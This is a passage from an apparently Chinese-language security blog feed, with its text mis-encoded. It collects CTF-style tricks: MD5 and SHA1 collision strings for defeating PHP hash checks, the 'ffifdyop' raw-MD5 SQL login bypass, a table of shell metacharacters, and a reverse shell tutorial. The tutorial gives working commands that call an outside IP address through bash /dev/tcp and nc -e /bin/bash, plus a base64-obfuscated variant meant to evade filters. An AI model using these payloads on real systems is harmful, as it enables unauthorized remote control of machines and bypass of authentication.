class="hljs-number">6</span>f%a7%b2%<span class="hljs-number">1</span>b%dc%<span class="hljs-number">56</span>%b7%<span class="hljs-number">4</span>a%<span class="hljs-number">3</span>d%c0%<span class="hljs-number">78</span>%<span class="hljs-number">3</span>e%<span class="hljs-number">7</span>b%<span class="hljs-number">95</span>%<span class="hljs-number">18</span>%af%bf%a2%<span class="hljs-number">00</span>%a8%<span class="hljs-number">28</span>%<span class="hljs-number">4</span>b%f3%<span class="hljs-number">6</span>e%<span class="hljs-number">8</span>e%<span class="hljs-number">4</span>b%<span class="hljs-number">55</span>%b3%<span class="hljs-number">5</span>f%<span class="hljs-number">42</span>%<span class="hljs-number">75</span>%<span class="hljs-number">93</span>%d8%<span class="hljs-number">49</span>%<span class="hljs-number">67</span>%<span class="hljs-number">6</span>d%a0%d1%<span class="hljs-number">55</span>%<span class="hljs-number">5</span>d%<span class="hljs-number">83</span>%<span class="hljs-number">60</span>%fb%<span class="hljs-number">5</span>f%<span class="hljs-number">07</span>%fe%a2 <br>â—  %<span class="hljs-number">4</span>d%c9%<span class="hljs-number">68</span>%ff%<span class="hljs-number">0</span>e%e3%<span class="hljs-number">5</span>c%<span class="hljs-number">20</span>%<span class="hljs-number">95</span>%<span class="hljs-number">72</span>%d4%<span class="hljs-number">77</span>%<span class="hljs-number">7</span>b%<span class="hljs-number">72</span>%<span class="hljs-number">15</span>%<span class="hljs-number">87</span>%d3%<span class="hljs-number">6</span>f%a7%b2%<span class="hljs-number">1</span>b%dc%<span class="hljs-number">56</span>%b7%<span class="hljs-number">4</span>a%<span class="hljs-number">3</span>d%c0%<span class="hljs-number">78</span>%<span class="hljs-number">3</span>e%<span class="hljs-number">7</span>b%<span class="hljs-number">95</span>%<span class="hljs-number">18</span>%af%bf%a2%<span class="hljs-number">02</span>%a8%<span class="hljs-number">28</span>%<span class="hljs-number">4</span>b%f3%<span class="hljs-number">6</span>e%<span class="hljs-number">8</span>e%<span class="hljs-number">4</span>b%<span class="hljs-number">55</span>%b3%<span class="hljs-number">5</span>f%<span class="hljs-number">42</span>%<span class="hljs-number">75</span>%<span class="hljs-number">93</span>%d8%<span class="hljs-number">49</span>%<span class="hljs-number">67</span>%<span class="hljs-number">6</span>d%a0%d1%d5%<span class="hljs-number">5</span>d%<span class="hljs-number">83</span>%<span class="hljs-number">60</span>%fb%<span class="hljs-number">5</span>f%<span class="hljs-number">07</span>%fe%a2  <br></code></pre></td></tr></table></figure><h3 id="MD5å€¼ä¸º0eå¼€å¤´çš„å­—ç¬¦"><a href="#MD5å€¼ä¸º0eå¼€å¤´çš„å­—ç¬¦" class="headerlink" title="MD5å€¼ä¸º0eå¼€å¤´çš„å­—ç¬¦"></a>MD5å€¼ä¸º0eå¼€å¤´çš„å­—ç¬¦</h3><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs dns">s878926199a<br>s155964671a<br>s214587387a<br>s214587387a<br><span class="hljs-number">240610708</span>ï¼š<span class="hljs-number">0</span>e4620974319065090195<span class="hljs-number">62988736854</span><br>QLTHNDTï¼š<span class="hljs-number">0</span>e40596782540195537<span class="hljs-number">2549139051580</span><br>QNKCDZOï¼š<span class="hljs-number">0</span>e830400451993494058<span class="hljs-number">024219903391</span><br>PJNPDWYï¼š<span class="hljs-number">0</span>e2915290528947027745<span class="hljs-number">57631701704</span><br>NWWKITQï¼š<span class="hljs-number">0</span>e7630820709760383476<span class="hljs-number">57360817689</span><br>NOOPCJFï¼š<span class="hljs-number">0</span>e818888003657176127<span class="hljs-number">862245791911</span><br>MMHUWUVï¼š<span class="hljs-number">0</span>e701732711630150438<span class="hljs-number">129209816536</span><br>MAUXXQCï¼š<span class="hljs-number">0</span>e4784784668484390404<span class="hljs-number">34801845361</span><br></code></pre></td></tr></table></figure><h3 id="sha1å€¼ç›¸ç­‰çš„å­—ç¬¦ä¸²"><a href="#sha1å€¼ç›¸ç­‰çš„å­—ç¬¦ä¸²" class="headerlink" title="sha1å€¼ç›¸ç­‰çš„å­—ç¬¦ä¸²"></a>sha1å€¼ç›¸ç­‰çš„å­—ç¬¦ä¸²</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">â— array1=%<span class="hljs-number">25</span>PDF-<span class="hljs-number">1.3</span>%<span class="hljs-number">0</span>A%<span class="hljs-number">25</span>%E2%E3%CF%D3%<span class="hljs-number">0</span>A%<span class="hljs-number">0</span>A%<span class="hljs-number">0</span>A1%<span class="hljs-number">200</span>%<span class="hljs-number">20</span>obj%<span class="hljs-number">0</span>A%<span class="hljs-number">3</span>C%<span class="hljs-number">3</span>C/Width%<span class="hljs-number">202</span>%<span class="hljs-number">200</span>%<span class="hljs-number">20</span>R/Height%<span class="hljs-number">203</span>%<span class="hljs-number">200</span>%<span class="hljs-number">20</span>R/Type%<span class="hljs-number">204</span>%<span class="hljs-number">200</span>%<span class="hljs-number">20</span>R/Subtype%<span class="hljs-number">205</span>%<span class="hljs-number">200</span>%<span class="hljs-number">20</span>R/Filter%<span class="hljs-number">206</span>%<span class="hljs-number">200</span>%<span class="hljs-number">20</span>R/ColorSpace%<span class="hljs-number">207</span>%<span class="hljs-number">200</span>%<span class="hljs-number">20</span>R/Length%<span class="hljs-number">208</span>%<span class="hljs-number">200</span>%<span class="hljs-number">20</span>R/BitsPerComponent%<span class="hljs-number">208</span>%<span class="hljs-number">3</span>E%<span class="hljs-number">3</span>E%<span class="hljs-number">0</span>Astream%<span class="hljs-number">0</span>A%FF%D8%FF%FE%<span class="hljs-number">00</span>%<span class="hljs-number">24</span>SHA-<span class="hljs-number">1</span>%<span class="hljs-number">20</span>is%<span class="hljs-number">20</span>dead%<span class="hljs-number">21</span>%<span class="hljs-number">21</span>%<span class="hljs-number">21</span>%<span class="hljs-number">21</span>%<span class="hljs-number">21</span>%<span class="hljs-number">85</span>/%EC%<span class="hljs-number">09</span>%<span class="hljs-number">239</span>u%<span class="hljs-number">9</span>C9%B1%A1%C6%<span class="hljs-number">3</span>CL%<span class="hljs-number">97</span>%E1%FF%FE%<span class="hljs-number">01</span>%<span class="hljs-number">7</span>FF%DC%<span class="hljs-number">93</span>%A6%B6%<span class="hljs-number">7</span>E%<span class="hljs-number">01</span>%<span class="hljs-number">3</span>B%<span class="hljs-number">02</span>%<span class="hljs-number">9</span>A%AA%<span class="hljs-number">1</span>D%B2V%<span class="hljs-number">0</span>BE%CAg%D6%<span class="hljs-number">88</span>%C7%F8K%<span class="hljs-number">8</span>CLy%<span class="hljs-number">1</span>F%E0%<span class="hljs-number">2</span>B%<span class="hljs-number">3</span>D%F6%<span class="hljs-number">14</span>%F8m%B1i%<span class="hljs-number">09</span>%<span class="hljs-number">01</span>%C5kE%C1S%<span class="hljs-number">0</span>A%FE%DF%B7%<span class="hljs-number">608</span>%E9rr/%E7%ADr%<span class="hljs-number">8</span>F%<span class="hljs-number">0</span>EI%<span class="hljs-number">04</span>%E0F%C20W%<span class="hljs-number">0</span>F%E9%D4%<span class="hljs-number">13</span>%<span class="hljs-number">98</span>%AB%E1.%F5%BC%<span class="hljs-number">94</span>%<span class="hljs-number">2</span>B%E35B%A4%<span class="hljs-number">80</span>-%<span class="hljs-number">98</span>%B5%D7%<span class="hljs-number">0</span>F%<span class="hljs-number">2</span>A3.%C3%<span class="hljs-number">7</span>F%AC5%<span class="hljs-number">14</span>%E7M%DC%<span class="hljs-number">0</span>F%<span class="hljs-number">2</span>C%C1%A8t%CD%<span class="hljs-number">0</span>Cx0Z%<span class="hljs-number">21</span>Vda0%<span class="hljs-number">97</span>%<span class="hljs-number">89</span>%<span class="hljs-number">60</span>k%D0%BF%<span class="hljs-number">3</span>F%<span class="hljs-number">98</span>%CD%A8%<span class="hljs-number">04</span>F%<span class="hljs-number">29</span>%A1<br>â— &amp;array2=%<span class="hljs-number">25</span>PDF-<span class="hljs-number">1.3</span>%<span class="hljs-number">0</span>A%<span class="hljs-number">25</span>%E2%E3%CF%D3%<span class="hljs-number">0</span>A%<span class="hljs-number">0</span>A%<span class="hljs-number">0</span>A1%<span class="hljs-number">200</span>%<span class="hljs-number">20</span>obj%<span class="hljs-number">0</span>A%<span class="hljs-number">3</span>C%<span class="hljs-number">3</span>C/Width%<span class="hljs-number">202</span>%<span class="hljs-number">200</span>%<span class="hljs-number">20</span>R/Height%<span class="hljs-number">203</span>%<span class="hljs-number">200</span>%<span class="hljs-number">20</span>R/Type%<span class="hljs-number">204</span>%<span class="hljs-number">200</span>%<span class="hljs-number">20</span>R/Subtype%<span class="hljs-number">205</span>%<span class="hljs-number">200</span>%<span class="hljs-number">20</span>R/Filter%<span class="hljs-number">206</span>%<span class="hljs-number">200</span>%<span class="hljs-number">20</span>R/ColorSpace%<span class="hljs-number">207</span>%<span class="hljs-number">200</span>%<span class="hljs-number">20</span>R/Length%<span class="hljs-number">208</span>%<span class="hljs-number">200</span>%<span class="hljs-number">20</span>R/BitsPerComponent%<span class="hljs-number">208</span>%<span class="hljs-number">3</span>E%<span class="hljs-number">3</span>E%<span class="hljs-number">0</span>Astream%<span class="hljs-number">0</span>A%FF%D8%FF%FE%<span class="hljs-number">00</span>%<span class="hljs-number">24</span>SHA-<span class="hljs-number">1</span>%<span class="hljs-number">20</span>is%<span class="hljs-number">20</span>dead%<span class="hljs-number">21</span>%<span class="hljs-number">21</span>%<span class="hljs-number">21</span>%<span class="hljs-number">21</span>%<span class="hljs-number">21</span>%<span class="hljs-number">85</span>/%EC%<span class="hljs-number">09</span>%<span class="hljs-number">239</span>u%<span class="hljs-number">9</span>C9%B1%A1%C6%<span class="hljs-number">3</span>CL%<span class="hljs-number">97</span>%E1%FF%FE%<span class="hljs-number">01</span>sF%DC%<span class="hljs-number">91</span>f%B6%<span class="hljs-number">7</span>E%<span class="hljs-number">11</span>%<span class="hljs-number">8</span>F%<span class="hljs-number">02</span>%<span class="hljs-number">9</span>A%B6%<span class="hljs-number">21</span>%B2V%<span class="hljs-number">0</span>F%F9%CAg%CC%A8%C7%F8%<span class="hljs-number">5</span>B%A8Ly%<span class="hljs-number">03</span>%<span class="hljs-number">0</span>C%<span class="hljs-number">2</span>B%<span class="hljs-number">3</span>D%E2%<span class="hljs-number">18</span>%F8m%B3%A9%<span class="hljs-number">09</span>%<span class="hljs-number">01</span>%D5%DFE%C1O%<span class="hljs-number">26</span>%FE%DF%B3%DC8%E9j%C2/%E7%BDr%<span class="hljs-number">8</span>F%<span class="hljs-number">0</span>EE%BC%E0F%D2%<span class="hljs-number">3</span>CW%<span class="hljs-number">0</span>F%EB%<span class="hljs-number">14</span>%<span class="hljs-number">13</span>%<span class="hljs-number">98</span>%BBU.%F5%A0%A8%<span class="hljs-number">2</span>B%E31%FE%A4%<span class="hljs-number">807</span>%B8%B5%D7%<span class="hljs-number">1</span>F%<span class="hljs-number">0E3</span>.%DF%<span class="hljs-number">93</span>%AC5%<span class="hljs-number">00</span>%EBM%DC%<span class="hljs-number">0</span>D%EC%C1%A8dy%<span class="hljs-number">0</span>Cx%<span class="hljs-number">2</span>Cv%<span class="hljs-number">21</span>V%<span class="hljs-number">60</span>%DD0%<span class="hljs-number">97</span>%<span class="hljs-number">91</span>%D0k%D0%AF%<span class="hljs-number">3</span>F%<span class="hljs-number">98</span>%CD%A4%BCF%<span class="hljs-number">29</span>%B1<br></code></pre></td></tr></table></figure><p>ä½¿ç”¨ffifdyopä¸‡èƒ½å¯†ç ç»•è¿‡ã€‚ffifdyopçš„MD5åŠ å¯†ç»“æœæ˜¯276f722736c95d99e921722cf9ed621cï¼Œç»è¿‡MySQLç¼–ç åä¼šå˜æˆ<code>&#39;or&#39;6xxx</code>,ä½¿SQLæ’æˆç«‹,ç›¸å½“äºä¸‡èƒ½å¯†ç ,å¯ä»¥ç»•è¿‡md5()å‡½æ•°çš„åŠ å¯†ã€‚å…³é”®å‚æ•°ä¸ºmd5(xx,true)ã€‚</p>]]></content>
    
    
    <categories>
      
      <category>å°çŸ¥è¯†</category>
      
    </categories>
    
    
    <tags>
      
      <tag>å°çŸ¥è¯†</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ç¬¦å·</title>
    <link href="/2025/04/25/%E7%AC%A6%E5%8F%B7/"/>
    <url>/2025/04/25/%E7%AC%A6%E5%8F%B7/</url>
    
    <content type="html"><![CDATA[<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs elixir">&amp;ç”¨äºåœ¨åŒä¸€å‘½ä»¤è¡Œä¸­ä¾æ¬¡æ‰§è¡Œå¤šä¸ªå‘½ä»¤ï¼Œä¸ç®¡å‰é¢çš„å‘½ä»¤æ‰§è¡Œæ˜¯å¦æˆåŠŸï¼Œåé¢çš„å‘½ä»¤éƒ½ä¼šç»§ç»­æ‰§è¡Œ<br>&amp;&amp;åŒæ ·ç”¨äºä¾æ¬¡æ‰§è¡Œå¤šä¸ªå‘½ä»¤ï¼Œä½†åªæœ‰å½“å‰é¢çš„å‘½ä»¤æˆåŠŸæ‰§è¡Œï¼ˆè¿”å›é€€å‡ºç ä¸º <span class="hljs-number">0</span>ï¼‰æ—¶ï¼Œåé¢çš„å‘½ä»¤æ‰ä¼šæ‰§è¡Œ<br>|æ˜¯ç®¡é“ç¬¦ï¼Œå°†å‰ä¸€ä¸ªå‘½ä»¤çš„è¾“å‡ºä½œä¸ºåä¸€ä¸ªå‘½ä»¤çš„è¾“å…¥<br>||ç”¨äºä¾æ¬¡æ‰§è¡Œå¤šä¸ªå‘½ä»¤ï¼Œåªæœ‰å½“å‰é¢çš„å‘½ä»¤æ‰§è¡Œå¤±è´¥ï¼ˆè¿”å›é€€å‡ºç ä¸ä¸º <span class="hljs-number">0</span>ï¼‰æ—¶ï¼Œåé¢çš„å‘½ä»¤æ‰ä¼šæ‰§è¡Œ<br>;ç”¨äºåˆ†éš”å¤šä¸ªå‘½ä»¤ä½¿å…¶æŒ‰é¡ºåºä¾æ¬¡æ‰§è¡Œï¼Œæ¯ä¸ªå‘½ä»¤éƒ½ä¼šç‹¬ç«‹æ‰§è¡Œï¼Œä¸ä¼šå½±å“åˆ°å…¶ä»–å‘½ä»¤çš„æ‰§è¡Œ<br>?åŒ¹é…ä¸€ä¸ªä»»æ„å­—ç¬¦<br>*åŒ¹é…<span class="hljs-number">0</span>ä¸ªæˆ–å¤šä¸ªä»»æ„å­—ç¬¦ï¼Œä¹Ÿå°±æ˜¯å¯ä»¥åŒ¹é…ä»»ä½•å†…å®¹<br>[]åŒ¹é…æ‹¬å·ä¸­ä»»æ„ä¸€ä¸ªå­—ç¬¦<br>[-]åŒ¹é…æ‹¬å·ä¸­ä»»æ„ä¸€ä¸ªå­—ç¬¦ï¼Œâ€œ-â€ä»£è¡¨èŒƒå›´<br>[^]é€»è¾‘éï¼Œè¡¨ç¤ºåŒ¹é…ä¸æ˜¯æ‹¬å·å†…çš„ä¸€ä¸ªå­—ç¬¦<br><span class="hljs-string">&#x27;&#x27;</span>å•å¼•å·ï¼Œåœ¨å•å¼•å·ä¸­æ‰€æœ‰çš„ç‰¹æ®Šç¬¦å·ï¼Œå¦‚ <span class="hljs-variable">$ </span>å’Œ `ï¼ˆåå¼•å·ï¼‰éƒ½æ— ç‰¹æ®Šå«ä¹‰<br><span class="hljs-string">&quot;&quot;</span>åŒå¼•å·ï¼Œåœ¨åŒå¼•å·ä¸­ç‰¹æ®Šç¬¦å·éƒ½æ— ç‰¹æ®Šå«ä¹‰ï¼Œä½† <span class="hljs-variable">$ </span>ã€ ` ï¼ˆåå¼•å·ï¼‰å’Œ \ æ˜¯ä¾‹å¤–ï¼Œæ‹¥æœ‰â€œè°ƒç”¨å˜é‡å€¼â€,â€œå¼•ç”¨å‘½ä»¤â€å’Œâ€œè½¬ä¹‰ç¬¦â€çš„ç‰¹æ®Šå«ä¹‰<br>`åå¼•å·ï¼šåå¼•å·æ‹¬èµ·æ¥çš„å†…å®¹æ˜¯ç³»ç»Ÿå‘½ä»¤ï¼Œåœ¨<span class="hljs-title class_">Bash</span>ä¸­å…ˆä¼šæ‰§è¡Œå®ƒå’Œ()<br><span class="hljs-variable">$(</span>)å’Œåå¼•å·ä½œç”¨ç›¸åŒï¼Œç”¨æ¥å¼•ç”¨ç³»ç»Ÿå‘½ä»¤<br><span class="hljs-comment">#åœ¨shellè„šæœ¬ä¸­,# å¼€å¤´çš„è¡Œä»£è¡¨æ³¨é‡Š</span><br><span class="hljs-variable">$</span>ç”¨äºè°ƒç”¨å˜é‡çš„å€¼ï¼Œå¦‚éœ€è¦è°ƒç”¨å˜é‡ name çš„å€¼æ—¶ï¼Œéœ€è¦ç”¨ <span class="hljs-variable">$name</span> çš„æ–¹å¼å¾—åˆ°<br>\è½¬ä¹‰ç¬¦ï¼Œè·Ÿåœ¨\ä¹‹åçš„ç‰¹æ®Šå­—ç¬¦å°†å¤±å»ç‰¹æ®Šå«ä¹‰ï¼Œå˜ä¸ºæ™®é€šå­—ç¬¦<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>å°çŸ¥è¯†</category>
      
    </categories>
    
    
    <tags>
      
      <tag>å°çŸ¥è¯†</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>åå¼¹shell</title>
    <link href="/2025/04/25/%E5%8F%8D%E5%BC%B9shell/"/>
    <url>/2025/04/25/%E5%8F%8D%E5%BC%B9shell/</url>
    
    <content type="html"><![CDATA[<h2 id="ä»€ä¹ˆæ˜¯åå¼¹shell"><a href="#ä»€ä¹ˆæ˜¯åå¼¹shell" class="headerlink" title="ä»€ä¹ˆæ˜¯åå¼¹shell"></a>ä»€ä¹ˆæ˜¯åå¼¹shell</h2><p>åå¼¹shellï¼ˆReverse Shellï¼‰æ˜¯ä¸€ç§å¸¸è§çš„æ”»å‡»æ–¹å¼ï¼Œé€šå¸¸ç”¨äºè¿œç¨‹æ§åˆ¶ç›®æ ‡ç³»ç»Ÿã€‚å®ƒä¸ä¼ ç»Ÿçš„â€œåå‘è¿æ¥â€ï¼ˆReverse Connectionï¼‰ç›¸ä¼¼ï¼Œé€šè¿‡å…è®¸ç›®æ ‡ç³»ç»Ÿä¸»åŠ¨è¿æ¥å›æ”»å‡»è€…çš„æœºå™¨ï¼Œä»è€Œç»•è¿‡é˜²ç«å¢™æˆ–NATï¼ˆç½‘ç»œåœ°å€è½¬æ¢ï¼‰ç­‰ç½‘ç»œå®‰å…¨æªæ–½ã€‚</p><p>åå¼¹ shell æ˜¯ä¸€ç§ç½‘ç»œæ”»å‡»æŠ€æœ¯ï¼Œå®ƒå…è®¸æ”»å‡»è€…åœ¨è¿œç¨‹ç›®æ ‡æœºå™¨ä¸Šæ‰§è¡Œä¸€ä¸ªå‘½ä»¤ï¼Œä½¿å¾—ç›®æ ‡æœºå™¨ä¸»åŠ¨å‘æ”»å‡»è€…çš„æœºå™¨å‘èµ·ç½‘ç»œè¿æ¥ï¼Œå°†ä¸€ä¸ªå‘½ä»¤è¡Œ shellï¼ˆå¦‚ bashã€cmd ç­‰ï¼‰æä¾›ç»™æ”»å‡»è€…ï¼Œä»è€Œè®©æ”»å‡»è€…èƒ½å¤Ÿæ§åˆ¶ç›®æ ‡æœºå™¨çš„ shellï¼Œå°±å¥½åƒç›´æ¥åœ¨ç›®æ ‡æœºå™¨ä¸Šæ“ä½œä¸€æ ·ã€‚</p><h2 id="ä»€ä¹ˆæ—¶å€™æƒ³è¦ä½¿ç”¨åå¼¹shell"><a href="#ä»€ä¹ˆæ—¶å€™æƒ³è¦ä½¿ç”¨åå¼¹shell" class="headerlink" title="ä»€ä¹ˆæ—¶å€™æƒ³è¦ä½¿ç”¨åå¼¹shell"></a>ä»€ä¹ˆæ—¶å€™æƒ³è¦ä½¿ç”¨åå¼¹shell</h2><p>å½“æˆ‘ä»¬åœ¨åç»­æ“ä½œä¸­éœ€è¦ä½¿ç”¨åˆ°ææƒï¼Œæˆ–è€…å‘½ä»¤æ‰§è¡Œå¤±è´¥ï¼Œæ‰§è¡Œå‘½ä»¤æ²¡æœ‰å›æ˜¾çš„æ—¶å€™ï¼Œæˆ‘ä»¬éƒ½éœ€è¦æƒ³åˆ°ä½¿ç”¨åå¼¹shellï¼Œä»¥ä¾¿æˆ‘ä»¬è¿›è¡Œåç»­çš„æ“ä½œ</p><p>åå¼¹shellçš„å‰ææ˜¯è¦æœ‰ä¸€ä¸ªVPS</p><h2 id="åå¼¹shellå·¥ä½œåŸç†"><a href="#åå¼¹shellå·¥ä½œåŸç†" class="headerlink" title="åå¼¹shellå·¥ä½œåŸç†"></a>åå¼¹shellå·¥ä½œåŸç†</h2><p>é€šå¸¸æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬ä¼šä»æœ¬åœ°è®¡ç®—æœºå‘èµ·è¿æ¥å»è®¿é—®è¿œç¨‹æœåŠ¡å™¨ï¼Œè¿™æ˜¯æ­£å‘è¿æ¥ï¼Œæ¯”å¦‚ä½¿ç”¨ SSHã€HTTP ç­‰åè®®ã€‚ç„¶è€Œï¼Œåœ¨æŸäº›æƒ…å†µä¸‹ï¼Œç›®æ ‡æœºå™¨å¯èƒ½å¤„äºé˜²ç«å¢™æˆ–ç½‘ç»œåœ°å€è½¬æ¢ï¼ˆNATï¼‰ä¹‹åï¼Œå¤–éƒ¨æ— æ³•ç›´æ¥è®¿é—®ï¼Œæˆ–è€…ç›®æ ‡æœºå™¨æœ‰ä¸¥æ ¼çš„å…¥ç«™è¿æ¥é™åˆ¶ï¼Œè¿™æ—¶æ­£å‘è¿æ¥å°±æ— æ³•å®ç°ã€‚</p><p>åœ¨ä¼ ç»Ÿçš„shellè¿œç¨‹è®¿é—®ä¸­ï¼Œæ”»å‡»è€…çš„æœºå™¨é€šå¸¸ä¼šä¸»åŠ¨è¿æ¥åˆ°ç›®æ ‡æœºå™¨ä¸Šã€‚åå¼¹shellä¸ä¹‹ç›¸åï¼Œåå¼¹shellåˆ©ç”¨åå‘è¿æ¥çš„æ¦‚å¿µï¼Œåœ¨ç›®æ ‡æœºå™¨ä¸Šæ‰§è¡Œä¸€ä¸ªå‘½ä»¤ï¼Œè¯¥å‘½ä»¤ä¼šä¸»åŠ¨å‘æ”»å‡»è€…æ§åˆ¶çš„æœåŠ¡å™¨å‘èµ·è¿æ¥ï¼Œç›®æ ‡æœºå™¨ä¸»åŠ¨è¿æ¥åˆ°æ”»å‡»è€…çš„æœºå™¨ï¼Œå¹¶å‘æ”»å‡»è€…çš„æœºå™¨å‘é€ä¸€ä¸ªshellï¼ˆå‘½ä»¤è¡Œæ¥å£ï¼‰ã€‚æ”»å‡»è€…é€šè¿‡è¿™ä¸ªshellå¯ä»¥ç»•è¿‡é˜²ç«å¢™å’ŒNATé™åˆ¶ï¼Œä»è€Œå¯ä»¥æ‰§è¡Œå‘½ä»¤ã€ä¸Šä¼ ã€ä¸‹è½½æ–‡ä»¶ç­‰æ“ä½œï¼Œå®ç°å¯¹ç›®æ ‡æœºå™¨çš„è¿œç¨‹æ§åˆ¶ã€‚</p><h3 id="åå¼¹shellå…·ä½“æ­¥éª¤"><a href="#åå¼¹shellå…·ä½“æ­¥éª¤" class="headerlink" title="åå¼¹shellå…·ä½“æ­¥éª¤"></a>åå¼¹shellå…·ä½“æ­¥éª¤</h3><ul><li>æ”»å‡»è€…ï¼šé¦–å…ˆï¼Œæ”»å‡»è€…å¯åŠ¨ä¸€ä¸ªç›‘å¬ç¨‹åºï¼ˆå¦‚ netcatï¼‰ï¼Œç­‰å¾…ç›®æ ‡æœºå™¨çš„è¿æ¥ã€‚</li><li>ç›®æ ‡æœºå™¨ï¼šç›®æ ‡æœºå™¨ï¼ˆè¢«æ”»å‡»çš„ç³»ç»Ÿï¼‰ä¼šä¸»åŠ¨å‘æ”»å‡»è€…æœºå™¨å‘èµ·è¿æ¥ï¼Œå¹¶å°†ä¸€ä¸ªshellè¿æ¥å›æ”»å‡»è€…</li><li>ä¸€æ—¦è¿æ¥å»ºç«‹ï¼Œæ”»å‡»è€…å°±å¯ä»¥é€šè¿‡è¯¥è¿æ¥æ¥æ§åˆ¶ç›®æ ‡æœºå™¨</li></ul><h3 id="åå¼¹shellè¿‡ç¨‹"><a href="#åå¼¹shellè¿‡ç¨‹" class="headerlink" title="åå¼¹shellè¿‡ç¨‹"></a>åå¼¹shellè¿‡ç¨‹</h3><ul><li>æ”»å‡»è€…ç«¯ï¼šæ”»å‡»è€…ä½¿ç”¨ä¸€ä¸ªç›‘å¬ç¨‹åºï¼ˆå¦‚<code>netcat</code>ï¼‰ç­‰å¾…æ¥è‡ªç›®æ ‡æœºå™¨çš„è¿æ¥ã€‚</li></ul><p>ä¾‹å¦‚ï¼šæ”»å‡»è€…åœ¨è‡ªå·±çš„æœºå™¨ä¸Šè¿è¡Œä¸€ä¸‹å‘½ä»¤æ¥ç›‘å¬ä¸€ä¸ªç«¯å£ï¼ˆå¦‚<code>2333</code>ç«¯å£ï¼‰</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nc -lvp 2333<br></code></pre></td></tr></table></figure><ul><li>ç›®æ ‡ç«¯ï¼šç›®æ ‡æœºå™¨å‘èµ·ä¸€ä¸ªè¿æ¥ä¼šæ”»å‡»è€…ï¼Œè¿æ¥åä¼šå¾—åˆ°ä¸€ä¸ªshellã€‚</li></ul><p>ä¾‹å¦‚ï¼šç›®æ ‡æœºå™¨ä¸Šä½¿ç”¨<code>netcat</code>å‘èµ·åå‘è¿æ¥ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs bash">----------------------------------------<br>bash -i &gt;&amp; /dev/tcp/47.122.75.126/2333 0&gt;&amp;1<br>/*<br>ä½¿ç”¨ Bash å®ç°åå¼¹ shellï¼ˆé€‚ç”¨äºLinuxç³»ç»Ÿï¼‰<br>bash -iï¼šæ‰“å¼€ä¸€ä¸ªäº¤äº’å¼çš„ bash shellã€‚<br>&gt;&amp;ï¼šå°†æ ‡å‡†è¾“å‡ºå’Œæ ‡å‡†é”™è¯¯è¾“å‡ºé‡å®šå‘ã€‚<br>/dev/tcp/47.122.75.126/2333ï¼šåˆ©ç”¨ bash çš„ç‰¹æ®Šæ–‡ä»¶è¡¨ç¤ºï¼Œå°è¯•å»ºç«‹ä¸€ä¸ªåˆ° 47.122.75.126 çš„ 2333 ç«¯å£çš„TCPè¿æ¥ã€‚<br>0&gt;&amp;1ï¼šå°†æ ‡å‡†è¾“å…¥é‡å®šå‘åˆ°æ ‡å‡†è¾“å‡ºï¼Œè¿™æ ·å¯ä»¥è®©æ”»å‡»è€…é€šè¿‡å»ºç«‹çš„TCPè¿æ¥ä¸ bash shell è¿›è¡Œäº¤äº’ã€‚<br>*/<br>----------------------------------------<br><span class="hljs-built_in">echo</span> bash -i &gt;&amp; /dev/tcp/47.122.75.126/2333 0&gt;&amp;1<br>----------------------------------------<br><span class="hljs-built_in">echo</span> YmFzaCAtaSA+JiAvZGV2L3RjcC80Ny4xMjIuNzUuMTI2LzIzMzMgMD4mMQ== | <span class="hljs-built_in">base64</span> -d| /bin/bash<br>/*<br>//base64ç¼–ç ç»•è¿‡<br>*/<br>----------------------------------------<br>nc 47.122.75.126 2333 -e /bin/bash<br>/*<br>2333 æ˜¯ç›‘å¬çš„ç«¯å£ï¼Œ-e /bin/bash è¡¨ç¤ºé€šè¿‡è¿™ä¸ªè¿æ¥æ‰§è¡Œ /bin/bash å‘½ä»¤ï¼Œå³å¯åŠ¨ä¸€ä¸ª shell<br>*/<br>----------------------------------------<br>nc -e /bin/bash 47.122.75.126 